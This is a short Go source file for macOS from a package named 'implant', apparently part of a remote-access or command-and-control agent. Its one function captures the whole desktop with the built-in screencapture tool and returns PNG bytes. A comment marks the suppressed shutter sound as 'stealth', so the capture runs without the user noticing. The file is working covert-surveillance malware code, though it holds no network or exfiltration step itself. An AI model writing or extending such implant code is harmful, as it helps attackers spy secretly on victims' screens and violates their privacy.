//go:build darwin

package implant

import (
	"context"
	"fmt"
	"os/exec"
	"time"
)

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
// Uses the built-in screencapture command available on all macOS versions.
func CaptureScreenshot() ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// -x: suppress camera shutter sound (stealth)
	// -t png: output format PNG
	// /dev/stdout: write to stdout
	cmd := exec.CommandContext(ctx, "screencapture", "-x", "-t", "png", "/dev/stdout")
	output, err := cmd.Output()
	if err != nil {
		if ctx.Err() != nil {
			return nil, fmt.Errorf("screencapture timed out: %w", ctx.Err())
		}
		return nil, fmt.Errorf("screencapture: %w", err)
	}

	if len(output) == 0 {
		return nil, fmt.Errorf("screencapture returned empty output")
	}

	return output, nil
}
